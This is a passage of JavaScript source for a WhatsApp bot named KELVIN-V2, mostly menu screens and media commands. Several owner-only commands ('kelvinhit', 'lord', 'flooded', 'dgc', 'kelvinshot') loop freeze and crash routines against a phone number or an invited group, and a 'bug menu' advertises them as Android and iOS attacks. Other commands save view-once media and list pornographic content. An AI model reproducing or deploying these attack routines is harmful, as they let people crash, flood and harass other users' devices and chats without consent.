replydare('🙂 *Be patient yeah*')
var Yoriai = await fetchJson(`https://widipe.com/bingai?text=${q}`)
var lenai = Yoriai.result
await replydare(`${lenai}`)
}
break
case 'addcase': {
    if (!isCreator) return replydare(mess.only.owner)
    if (!text) return replydare('Wheres the case?');
    const fs = require('fs');
// Nama file yang akan dimodifikasi
const namaFile = 'kelvin.js';

// Kode case baru yang ingin Anda tambahkan
const caseBaru = `${text}`;

// Baca isi file
fs.readFile(namaFile, 'utf8', (err, data) => {
    if (err) {
        console.error('An error occurred while reading the file:', err);
        return;
    }

    // Cari posisi awal dari kumpulan case 'gimage'
    const posisiAwalGimage = data.indexOf("case 'addcase':");

    if (posisiAwalGimage !== -1) {
        // Tambahkan case baru tepat di atas case 'gimage'
        const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);

        // Tulis kembali file dengan case baru
        fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                replydare('An error occurred while writing the file:', err);
            } else {
                replydare('New case successfully added above gimage case.');
            }
        });
    } else {
        replydare('Cannot find gimage case in files.');
    }
});

}
break;
case 'getcase':
if (!isCreator) return replydare(mess.only.owner)
const getCase = (cases) => {
return "case"+`'${cases}'`+fs.readFileSync("dare").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
}
replydare(`${getCase(isCreator)}`)
break

case 'sound1':
case 'sound2':
case 'sound3':
case 'sound4':
case 'sound5':
case 'sound6':
case 'sound7':
case 'sound8':
case 'sound9':
case 'sound10':
case 'sound11':
case 'sound12':
case 'sound13':
case 'sound14':
case 'sound15':
case 'sound16':
case 'sound17':
case 'sound18':
case 'sound19':
case 'sound20':
case 'sound21':
case 'sound22':
case 'sound23':
case 'sound24':
case 'sound25':
case 'sound26':
case 'sound27':
case 'sound28':
case 'sound29':
case 'sound30':
case 'sound31':
case 'sound32':
case 'sound33':
case 'sound34':
case 'sound35':
case 'sound36':
case 'sound37':
case 'sound38':
case 'sound39':
case 'sound40':
case 'sound41':
case 'sound42':
case 'sound43':
case 'sound44':
case 'sound45':
case 'sound46':
case 'sound47':
case 'sound48':
case 'sound49':
case 'sound50':
case 'sound51':
case 'sound52':
case 'sound53':
case 'sound54':
case 'sound55':
case 'sound56':
case 'sound57':
case 'sound58':
case 'sound59':
case 'sound60':
case 'sound61':
case 'sound62':
case 'sound63':
case 'sound64':
case 'sound65':
case 'sound66':
case 'sound67':
case 'sound68':
case 'sound69':
case 'sound70':
case 'sound71':
case 'sound72':
case 'sound73':
case 'sound74':
case 'sound75':
case 'sound76':
case 'sound77':
case 'sound78':
case 'sound79':
case 'sound80':
case 'sound81':
case 'sound82':
case 'sound83':
case 'sound84':
case 'sound85':
case 'sound86':
case 'sound87':
case 'sound88':
case 'sound89':
case 'sound90':
case 'sound91':
case 'sound92':
case 'sound93':
case 'sound94':
case 'sound95':
case 'sound96':
case 'sound97':
case 'sound98':
case 'sound99':
case 'sound100':
case 'sound101':
case 'sound102':
case 'sound103':
case 'sound104':
case 'sound105':
case 'sound106':
case 'sound107':
case 'sound108':
case 'sound109':
case 'sound110':
case 'sound111':
case 'sound112':
case 'sound113':
case 'sound114':
case 'sound115':
case 'sound116':
case 'sound117':
case 'sound118':
case 'sound119':
case 'sound120':
case 'sound121':
case 'sound122':
case 'sound123':
case 'sound124':
case 'sound125':
case 'sound126':
case 'sound127':
case 'sound128':
case 'sound129':
case 'sound130':
case 'sound131':
case 'sound132':
case 'sound133':
case 'sound134':
case 'sound135':
case 'sound136':
case 'sound137':
case 'sound138':
case 'sound139':
case 'sound140':
case 'sound141':
case 'sound142':
case 'sound143':
case 'sound144':
case 'sound145':
case 'sound146':
case 'sound147':
case 'sound148':
case 'sound149':
case 'sound150':
case 'sound151':
case 'sound152':
case 'sound153':
case 'sound154':
case 'sound155':
case 'sound156':
case 'sound157':
case 'sound158':
case 'sound159':
case 'sound160':
case 'sound161':
dare._dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
await dare.sendMessage(m.chat, { audio: dare._dev, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
break
case 'kelvinhit': case 'lava': {
await dare.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
if (!isCreator) return replydare(mess.owner)
if (!q) return replydare(`Example: ${prefix + command} 233###
> ONLY USE THIS COMMAND IN PERSON 
> ALSO DONT ADD AMOUNT JUST NUMBER`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await nulltag(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezegc(target, true)
await freezeuii(target, true)
await freezekamoflase(target, true)
await nulltag(target, true)
await nulltag(target, true)
await NewsletterZap(target, true)
await freezegc(target, true)
await freezeuii(target, true)
}
replydare(`
🦣 *dare* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await dare.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break 
case 'dgc': {
await dare.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
if (!isCreator) return replydare(mess.owner)
if (!q) return replydare(`Use .${command} https://chat.whatsapp.com/`)
replydare(`</> Bugs have been sent... `)
let result = args[0].split('https://chat.whatsapp.com/')[1];
let target = await dare.groupAcceptInvite(result);
for (let i = 0; i < 70; i++) {
await caltx(target, true)
await sleep(10)
await freezegc(target, true)
}
replydare(`
🦣 *dare* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await dare.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break

break
case 'lord': case 'ui-freeze': case 'flooded': {
await dare.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
if (!isCreator) return replydare(mess.owner)
if (!q) return replydare(`Example: ${prefix + command} 233###`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
for (let i = 0; i < 70; i++) {
await freezekamoflase(target, true)
await freezeui(target, true)
await freezeuii(target, true)
await newvirpen(target, true)
await freezeui(target, true)
await freezeuii(target, true)

}
replydare(`
🦣 *dare* 𝐇𝐀𝐒 𝐃𝐄𝐋𝐈𝐕𝐄𝐑𝐄𝐃 🦈
━━━━━━━━━━━━━━━━━━━━━━
߷ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
֎ 𝐑𝐄𝐒𝐔𝐋𝐓 : 𝗨𝗧𝗜𝗟𝗜𝗦𝗘𝗗
᪣ 𝐔𝐒𝐈𝐍𝐆 : ${command}
━━━━━━━━━━━━━━━━━━━━━━
   `)
await sleep(2000)
await dare.sendMessage(m.chat, {
audio: bug,
mimetype: 'audio/mpeg'
}, { quoted: extd
})
}
break
    case 'kelvinshot': case 'p1': case 'penetrate': case 'tackle':{
if (!isCreator) return replydare(mess.owner)
for (let j = 0; j < 30; j++) {
await nulltag(m.chat, dare, ptcp = true)
await freezekamoflase(m.chat, dare, ptcp = true)
await freezeui(m.chat, dare, ptcp = true)
await freezeuii(m.chat, dare, ptcp = true)
await newvirpen(m.chat, dare, ptcp =true)
}
}

break
case 'readviewonce': case 'rvo': {
	if (!m.quoted) return replydare(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replydare(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return dare.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return dare.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'clearchat':
xeonimun('\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n')
break
            
  
          
case 'menu': {
await dare.sendMessage(m.chat, { react: { text: `💀`, key: m.key }})
    let xmenu_oh = `KELVIN-V2
━━━━━━━━━━━━━━━━━━━━━
> ✨ *Welcome*: ${daretimewisher}
━━━━━━━━━━━━━━━━━━━━━
> 👤 *User*: ${pushname}
> 👑 *Owner*: ${global.ownername}
> 🔑 *Prefix*: ⌕${global.prefa}⌕
> ⏱️ *Uptime*: ${runtime(process.uptime())}
> 🛠️ *Account Type*: ${isPremium ? "Premium" : "Free"}
> 💻 *Host*: ${os.hostname()}
> 💾 *Platform*: ${os.platform()}
════════════════════
> Hello ${pushname}
════════════════════
${readmore}
┏━━⊱乂 MENU
┣❏ *BUGMENU.*
┣❏ *FUN MENU.*
┣❏ *OWNERMENU.*
┣❏ *MAINMENU.*
┣❏ *CONVERTMENU.*
┣❏ *DATABASEMENU.*
┣❏ *DOWNLOADMENU.*
┣❏ *ANIMEMENU.*
┣❏ *CREAMPIEMENU.*
╚════════════════════
╚════════════════════`;
dare.sendMessage(m.chat, {
                        image: fs.readFileSync('./dmedia/menu2.jpg'),
                        caption: xmenu_oh 
                    }, {
                        quoted: m
                    })
dare.sendMessage(m.chat, {audio: darkphonk, mimetype:'audio/mp4', ptt: true}, {quoted: m })   
}
break;
case 'daremenu': {
await dare.sendMessage(m.chat, { react: { text: `🤪`, key: m.key }})
    const xmenu_oh = `
════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}
┏━━⊱乂 MENU
┣❏ *BUGMENU.*
┣❏ *FUN MENU.*
┣❏ *OWNERMENU.*
┣❏ *MAINMENU.*
┣❏ *CONVERTMENU.*
┣❏ *DATABASEMENU.*
┣❏ *DOWNLOADMENU.*
┣❏ *ANIMEMENU.*
╚════════════════════
KELVIN-V2 𝘽𝙔 KELVIN
╚════════════════════`;

    if (typemenu === 'v1') {
        dare.sendMessage(m.chat, {
            text: xmenu_oh,
            contextInfo: {
                externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                    sourceUrl: link,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } else if (typemenu === 'v2') {
        dare.sendMessage(m.chat, {
            video: fs.readFileSync('./dmedia/11.mp3'),
            gifPlayback: true,
            caption: xmenu_oh,
            contextInfo: {
                externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                    sourceUrl: '',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } else if (typemenu === 'v3') {
        dare.sendMessage(m.chat, {
            video: fs.readFileSync('./dmedia/11.mp3'),
            caption: xmenu_oh,
            gifPlayback: true
        }, { quoted: m });
    } else if (typemenu === 'v4') {
        dare.relayMessage(m.chat, {
            scheduledCallCreationMessage: {
                callType: "AUDIO",
                scheduledTimestampMs: 1200,
                title: xmenu_oh
            }
        }, {});
    }
    break;
}
case 'creampiemenu': {
await dare.sendMessage(m.chat, { react: { text: `💦`, key: m.key }})
    const xmenu_oh = `
════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}
┏━━⊱乂 CREAMPIE MENU
┣❏ *HNEKO.*
┣❏ *TRAP.*
┣❏ *ANIMESPANK.*
┣❏ *GIFBLOWJOB.*
┣❏ *NWAIFU.*
╚════════════════════
KELVIN-V2 𝘽𝙔 KELVIN
╚════════════════════`;

    if (typemenu === 'v1') {
        dare.sendMessage(m.chat, {
            text: xmenu_oh,
            contextInfo: {
                externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                    sourceUrl: link,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } else if (typemenu === 'v2') {
        dare.sendMessage(m.chat, {
            video: fs.readFileSync('./dmedia/11.mp3'),
            gifPlayback: true,
            caption: xmenu_oh,
            contextInfo: {
                externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                    sourceUrl: '',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    } else if (typemenu === 'v3') {
        dare.sendMessage(m.chat, {
            video: fs.readFileSync('./dmedia/11.mp3'),
            caption: xmenu_oh,
            gifPlayback: true
        }, { quoted: m });
    } else if (typemenu === 'v4') {
        dare.relayMessage(m.chat, {
            scheduledCallCreationMessage: {
                callType: "AUDIO",
                scheduledTimestampMs: 1200,
                title: xmenu_oh
            }
        }, {});
    }
    break;
}

    case 'kelvinmenu':
    xmenu_oh = `
════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}

┏━━⊱乂 MENU
┣❏ *BUGMENU.*
┣❏ *FUN MENU.*
┣❏ *OWNERMENU.*
┣❏ *MAINMENU.*
┣❏ *CONVERTMENU.*
┣❏ *DATABASEMENU.*
┣❏ *DOWNLOADMENU.*
┣❏ *ANIMEMENU.*
╚════════════════════
KELVIN-V2 𝘽𝙔 KELVIN
╚════════════════════`;
if (typemenu === 'v1') {
                    dare.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    dare.sendMessage(m.chat, {
      video: fs.readFileSync('./dmedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    dare.sendMessage(m.chat, {
                        video: fs.readFileSync('./dmedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    dare.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break

                case 'funmenu':                                        xmenu_oh = `
════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}
┏━━⊱ *FUN ᴍᴇɴᴜ*
┣❏ *AI*
┣❏ *SS*
┣❏ *ENCRYPT*
┣❏ *RPS*
┣❏ *VV*
┣❏ *VV2*
╚════════════════════
KELVIN-V2 𝘽𝙔 KELVIN`
if (typemenu === 'v1') {
                    dare.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    dare.sendMessage(m.chat, {
      video: fs.readFileSync('./dmedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    dare.sendMessage(m.chat, {
                        video: fs.readFileSync('./dmedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    dare.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                
                                case 'bugmenu':          xmenu_oh = `
 ════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}
┏━━⊱乂 ʙᴜɢ ᴀɴᴅʀᴏɪᴅ
┣❏ *kelvinhit*
┣❏ *LORD*
┣❏ *kelvinshot*
┣❏ *P1*
┣❏ *TACKLE*
┣❏ *LAVA*
┣❏ *PENETRATE*
┏━━⊱  乂 *ʙᴜɢ ɪᴏꜱ*
┣❏ *FLOODED*
┏━━⊱ 乂 *ʙᴜɢ ɢʀᴏᴜᴘ ᴄʜᴀᴛ*
┣❏ *DGC*
╚════════════════════`
      if (typemenu === 'v1') {
                    dare.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    dare.sendMessage(m.chat, {
      video: fs.readFileSync('./dmedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    dare.sendMessage(m.chat, {
                        video: fs.readFileSync('./dmedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    dare.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                

                case 'ownermenu':
xmenu_oh = `
════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}
┏━━⊱ 乂 *ᴏᴡɴᴇʀ ᴍᴇɴᴜ*
┣❏ *GETSESSION*
┣❏ *DELETESESSION*
┣❏ *JOIN*
┣❏ *SHUTDOWN* 
┣❏ *RESTART*
┣❏ *AUTOREAD* *[option]*
┣❏ *AUTOTYPING* *[option]*
┣❏ *AUTORECORDING* *[option]*
┣❏ *AUTORECORDTYP* *[option]*
┣❏ *AUTOBIO* *[option]*
┣❏ *AUTOSTATUSVIEW* *[option]*
┣❏ *MODE* *[option]*
┣❏ *BLOCK*
┣❏ *UNBLOCK*
┣❏ *BACKUP*
┣❏ *GETCASE*
┣❏ *ADDOWNER*
┣❏ *DELOWNER*
╚════════════════════`
if (typemenu === 'v1') {
                    dare.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    dare.sendMessage(m.chat, {
      video: fs.readFileSync('./dmedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    dare.sendMessage(m.chat, {
                        video: fs.readFileSync('./dmedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    dare.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                case 'mainmenu':
                xmenu_oh = `
════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}
┏━━⊱ 乂 *ᴍᴀɪɴ ᴍᴇɴᴜ*
┣❏ *MENU*
┣❏ *BUYPREMIUM*
┣❏ *RUNTIME*
┣❏ *SCRIPT*
┣❏ *DONATE*
┣❏ *OWNER*
╚════════════════════`
if (typemenu === 'v1') {
                    dare.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    dare.sendMessage(m.chat, {
      video: fs.readFileSync('./dmedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    dare.sendMessage(m.chat, {
                        video: fs.readFileSync('./dmedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    dare.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                case 'convertmenu':
                 xmenu_oh = `
════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}
┏━━⊱  乂 *ᴄᴏɴᴠᴇʀᴛ ᴍᴇɴᴜ*
┣❏ *STIKER*
┣❏ *SMEME*
┣❏ *xmenu_ohE*
┣❏ *TOIMAGE*
┣❏ *TOVIDEO*
┣❏ *TOAUDIO*
┣❏ *TOMP3*
┣❏ *TOVN*
┣❏ *TOGIF*
┣❏ *TOURL*
┣❏ *TOQR*
┣❏ *TOVIEWONCE*
┣❏ *FLIPTEXT*
┣❏ *EMOJIMIX*
╚════════════════════`
if (typemenu === 'v1') {
                    dare.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    dare.sendMessage(m.chat, {
      video: fs.readFileSync('./dmedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    dare.sendMessage(m.chat, {
                        video: fs.readFileSync('./dmedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    dare.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                case 'databasemenu':
                 xmenu_oh = `
════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}
┏━━⊱  乂 *ᴅᴀᴛᴀʙᴀsᴇ ᴍᴇɴᴜ*
┣❏ *ADDVIDEO*
┣❏ *ADDIMAGE*
┣❏ *ADDSTICKER*
┣❏ *ADDVN*
┣❏ *ADDZIP*
┣❏ *ADDAPK*
┣❏ *ADDPDF*
┣❏ *DELVIDEO*
┣❏ *DELIMAGE*
┣❏ *DELSTICKER*
┣❏ *DELVN*
┣❏ *DELZIP*
┣❏ *DELAPK*
┣❏ *DELPDF*
┣❏ *LISTVIDEO*
┣❏ *LISTIMAGE*
┣❏ *LISTSTICKER*
┣❏ *LISTVN*
┣❏ *LISTZIP*
┣❏ *LISTAPK*
┣❏ *LISTPDF*
╚════════════════════`
if (typemenu === 'v1') {
                    dare.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    dare.sendMessage(m.chat, {
      video: fs.readFileSync('./dmedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    dare.sendMessage(m.chat, {
                        video: fs.readFileSync('./dmedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    dare.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                case 'downloadmenu':
                xmenu_oh = `
════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}
 
 ┏━━⊱  乂 ᴅᴏᴡɴ ᴍᴇɴᴜ
┣❏ *FBVIDEO*
┣❏ *TIKTOKVIDEO*
┣❏ *PLAY*
┣❏ *YTMP3*
┣❏ *YTMP4*
┣❏ *SOUND 1 - SOUND161*
╚════════════════════`
if (typemenu === 'v1') {
                    dare.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    dare.sendMessage(m.chat, {
      video: fs.readFileSync('./dmedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    dare.sendMessage(m.chat, {
                        video: fs.readFileSync('./dmedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    dare.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: xmenu_oh
                        }
                    }, {})
                }
                break
                case 'animemenu':
                xmenu_oh = `
════════════════════
> Hello ${pushname}
════════════════════
> ╰⭑➤⭑➤ ${daretimewisher} 😇
${readmore}

 ┏━━⊱  乂 *ANIME MENU*
┣❏ *SHINOBU*
┣❏ *STICKHANDHOLD*
┣❏ *STICKSHINOBU*
┣❏ *STICKHIGHFIVE*
┣❏ *STICKCUDDLE*
┣❏ *STICKCRINGE*
┣❏ *STICKDANCE*
┣❏ *STICKHAPPY*
┣❏ *STICKGLOMP*
┣❏ *STICKMUG*
┣❏ *STICKERBLUSH*
┣❏ *STICKAWOO*
┣❏ *STICKWAVE*
╚════════════════════ `
if (typemenu === 'v1') {
                    dare.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                            }
                        }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v2') {
                    dare.sendMessage(m.chat, {
      video: fs.readFileSync('./dmedia/11.mp3'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://files.catbox.moe/byytni.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                } else if (typemenu === 'v3') {
                    dare.sendMessage(m.chat, {
                        video: fs.readFileSync('./dmedia/11.mp3'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
